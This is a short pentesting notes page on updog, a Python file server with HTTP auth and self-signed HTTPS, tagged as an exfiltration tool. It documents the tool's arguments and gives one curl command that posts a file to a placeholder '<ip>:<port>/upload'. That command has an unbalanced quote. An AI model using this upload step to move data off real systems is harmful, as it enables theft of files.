---
tags:
  - "#type/tool"
  - "#attack/exfiltration"
Link: https://github.com/sc0tfree/updog
Purpose: download and upload files using http(s)
---
# Info

basically works like [[3 Tools/file-transfer/simple python webserver|simple python webserver]] but allows http auth and https with self signed certificates - more easy to use

# Usage

`updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]`

| Argument                              | Description                                      |
| ------------------------------------- | ------------------------------------------------ |
| `-d DIRECTORY, --directory DIRECTORY` | Root directory [Default=.]                       |
| `-p PORT, --port PORT`                | Port to serve [Default=9090]                     |
| `--password PASSWORD`                 | Use a password to access the page. (No username) |
| `--ssl`                               | Enable transport encryption via SSL              |
| `--version`                           | Show version                                     |
| `-h, --help`                          | Show help                                        |

**Note:** Updog is quite picky regarding upload requests. The following [[3 Tools/web/cURL|cURL]] snippet works:

``` powershell
curl.exe -X POST -F "file=@<filename> -F "path=<file_directory>" http://<ip>:<port>/upload

```

Further reading: https://ku.nz/blog/updogcurl.html
